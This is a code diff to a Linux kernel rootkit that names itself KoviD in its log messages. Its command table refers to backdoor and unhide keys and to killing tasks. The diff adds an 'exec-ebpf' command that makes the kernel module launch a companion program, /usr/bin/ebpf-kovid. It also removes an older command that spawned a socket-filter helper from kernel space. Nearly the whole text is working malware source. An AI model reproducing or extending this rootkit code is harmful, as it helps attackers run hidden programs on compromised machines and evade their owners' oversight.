@@ -450,13 +450,13 @@ enum {
 	Opt_signal_task_stop,
 	Opt_signal_task_cont,
 	Opt_signal_task_kill,
+	Opt_exec_epbf,
 
 #ifdef DEBUG_RING_BUFFER
 	/**debug */
 	Opt_get_bdkey,
 	Opt_get_unhidekey,
 #endif
-	Opt_socket_filter,
 };
 
 static const match_table_t tokens = {
@@ -485,7 +485,7 @@ static const match_table_t tokens = {
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
 #endif
-	{ Opt_socket_filter, "socket-filter" },
+	{ Opt_exec_epbf, "exec-ebpf" },
 	{ Opt_unknown, NULL }
 };
 
@@ -634,6 +634,14 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 				kv_run_system_command(cmd);
 			}
 		} break;
+		case Opt_exec_epbf: {
+			char *cmd[] = { "/usr/bin/ebpf-kovid", NULL, NULL };
+			if (!kv_run_system_command(cmd)) {
+				pr_info("KoviD: Launching ebpf-kovid program\n");
+			} else {
+				pr_info("KoviD: Failed to run ebpf-kovid program\n");
+			}
+		} break;
 #ifdef DEBUG_RING_BUFFER
 		case Opt_get_bdkey:
 		case Opt_get_unhidekey: {
@@ -666,26 +674,6 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 			if (sscanf(args[0].from, "%d", &pid) == 1)
 				_run_send_sig(SIGKILL, pid, false);
 			break;
-		case Opt_socket_filter: {
-			static char *argv[] = { "socket_filter", NULL };
-			static char *envp[] = {
-				"HOME=/", "PATH=/sbin:/bin:/usr/sbin:/usr/bin",
-				NULL
-			};
-
-			pr_info("KoviD: Launching socket_filter_user via call_usermodehelper.\n");
-
-			/*
-			 * Use UMH_WAIT_PROC if you want to block until the user-space program
-			 * finishes. UMH_NO_WAIT just spawns it and returns immediately.
-			 */
-			int ret = call_usermodehelper(argv[0], argv, envp,
-						      UMH_NO_WAIT);
-			if (ret < 0) {
-				pr_err("KoviD: Failed to run socket_filter_user, ret=%d\n",
-				       ret);
-			}
-		} break;
 		default:
 			break;
 		}
